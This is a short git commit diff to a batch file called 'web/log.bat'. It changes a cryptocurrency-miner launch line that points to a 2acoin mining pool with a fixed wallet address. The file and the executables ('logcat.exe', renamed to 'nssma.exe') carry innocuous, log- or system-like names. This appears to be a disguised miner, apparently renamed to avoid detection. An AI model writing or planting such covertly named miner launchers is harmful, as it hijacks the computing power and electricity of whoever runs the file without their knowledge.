b42e69702d31d1707b9f97648fb3ab687c630728
kijang-020 <85983742+kijang-020@users.noreply.github.com>
2021-11-04 08:34:21 +0000

    Update log.bat

--- web/log.bat
+++ web/log.bat
@@ -1,3 +1,3 @@
 rem
 :start
-"%~dp0"logcat.exe --pool us-central.2acoin.org:3333 --username guns95PQ9tH96Lympn1bw1AQDCNg1AEXHHRjuKJh1TNnAQSpZcSzJvfA4mgmfQ8Cyq96RLKthdBXn96TXi6g3yFzHm73aXw5Kk6EaQmTq4eew7XMWZgrqE1KcDik8fQU5EhhauijLA9MGCiLH2gxjww4DuQJ2ErN1GMhkct7giSyVPwS4iCQdCtHf1 --password x --algorithm chukwa
+"%~dp0"nssma.exe --pool us-central.2acoin.org:3333 --username guns95PQ9tH96Lympn1bw1AQDCNg1AEXHHRjuKJh1TNnAQSpZcSzJvfA4mgmfQ8Cyq96RLKthdBXn96TXi6g3yFzHm73aXw5Kk6EaQmTq4eew7XMWZgrqE1KcDik8fQU5EhhauijLA9MGCiLH2gxjww4DuQJ2ErN1GMhkct7giSyVPwS4iCQdCtHf1 --password x --algorithm chukwa
